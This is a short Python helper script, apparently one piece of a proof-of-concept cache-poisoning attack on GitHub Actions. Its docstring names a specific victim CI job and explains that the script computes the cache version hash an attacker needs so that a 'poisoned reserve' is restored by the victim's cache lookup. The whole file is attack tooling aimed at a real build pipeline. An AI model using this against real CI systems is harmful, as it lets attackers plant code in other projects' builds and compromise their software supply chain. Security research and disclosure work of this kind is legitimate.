#!/usr/bin/env python3
"""
cache_version.py — the "version" component of the Actions cache lookup.

The victim (rust-ci's argument_comment_lint_package job, actions/cache@v5.0.4)
restores with
  GET /_apis/artifactcache/caches?keys=<key>&version=<version>
where version = sha256 of the workflow's path inputs joined with '|', plus
the compression method and the toolkit's salt (dist bundle: getCacheVersion,
CompressionMethod.ZstdWithoutLong = "zstd-without-long" on this runner image,
versionSalt = "1.0"). The attacker needs the same string for the poisoned
reserve to be found by that lookup.
"""

import hashlib
import sys

PATHS = [
    "~/.cargo/bin/cargo-dylint",
    "~/.cargo/bin/dylint-link",
    "~/.cargo/registry/index",
    "~/.cargo/registry/cache",
    "~/.cargo/git/db",
]


def main():
    paths = sys.argv[1:] or PATHS
    components = paths + ["zstd-without-long", "1.0"]
    print(hashlib.sha256("|".join(components).encode()).hexdigest())


if __name__ == "__main__":
    main()
